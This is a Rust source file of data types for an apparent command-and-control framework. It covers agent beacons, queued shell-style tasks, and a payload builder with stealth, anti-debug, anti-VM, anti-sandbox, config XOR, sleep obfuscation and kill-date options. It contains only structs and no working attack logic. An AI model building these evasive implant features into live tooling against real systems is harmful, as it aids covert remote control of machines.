use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentRegistration {
    pub agent_id: String,
    pub hostname: String,
    pub os: String,
    pub architecture: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BeaconRequest {
    pub registration: AgentRegistration,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BeaconReply {
    pub status: String,
    pub sleep_seconds: u64,
    pub task: Option<Task>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Task {
    pub task_id: String,
    pub command: String,
    pub arguments: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct TaskRecord {
    pub agent_id: String,
    pub task: Task,
    pub status: TaskStatus,
    pub created_at_unix: u64,
    pub dispatched_at_unix: Option<u64>,
    pub completed_at_unix: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum TaskStatus {
    Queued,
    Dispatched,
    Completed,
    Failed,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentResponse {
    pub agent_id: String,
    pub task_id: Option<String>,
    pub output: String,
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentRecord {
    pub registration: AgentRegistration,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum AgentStatus {
    Online,
    Stale,
    Offline,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct AgentSummary {
    pub registration: AgentRegistration,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
    pub status: AgentStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadConfig {
    pub callback_url: String,
    pub sleep_seconds: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadBuildRequest {
    pub callback_url: Option<String>,
    pub sleep_seconds: Option<u64>,
    pub jitter_percent: Option<u64>,
    pub agent_id: Option<String>,
    pub agent_token: Option<String>,
    pub label: Option<String>,
    pub stealth: Option<bool>,
    pub anti_debug: Option<bool>,
    pub anti_vm: Option<bool>,
    pub anti_sandbox: Option<bool>,
    pub daemonize: Option<bool>,
    pub static_runtime: Option<bool>,
    pub xor_config: Option<bool>,
    pub xor_key: Option<u64>,
    pub target_os: Option<String>,
    pub format: Option<String>,
    pub kill_date_epoch: Option<u64>,
    pub ua_randomize: Option<bool>,
    pub sleep_obfuscate: Option<bool>,
    pub encrypt_payload: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PayloadArtifact {
    pub build_id: String,
    pub label: Option<String>,
    pub binary_path: String,
    pub callback_url: String,
    pub sleep_seconds: u64,
    pub format: Option<String>,
    #[serde(default)]
    pub jitter_percent: u64,
    pub agent_id: Option<String>,
    pub agent_token_configured: bool,
    pub stealth: bool,
    #[serde(default)]
    pub anti_debug: bool,
    #[serde(default)]
    pub anti_vm: bool,
    #[serde(default)]
    pub anti_sandbox: bool,
    #[serde(default)]
    pub daemonize: bool,
    #[serde(default)]
    pub static_runtime: bool,
    #[serde(default)]
    pub xor_config: bool,
    #[serde(default)]
    pub xor_key: u64,
    #[serde(default = "default_payload_target_os")]
    pub target_os: String,
    pub run_args: Vec<String>,
    pub created_at_unix: u64,
    #[serde(default)]
    pub kill_date_epoch: u64,
    #[serde(default)]
    pub ua_randomize: bool,
    #[serde(default)]
    pub sleep_obfuscate: bool,
    #[serde(default)]
    pub encrypt_payload: bool,
}

fn default_payload_target_os() -> String {
    "linux".to_owned()
}
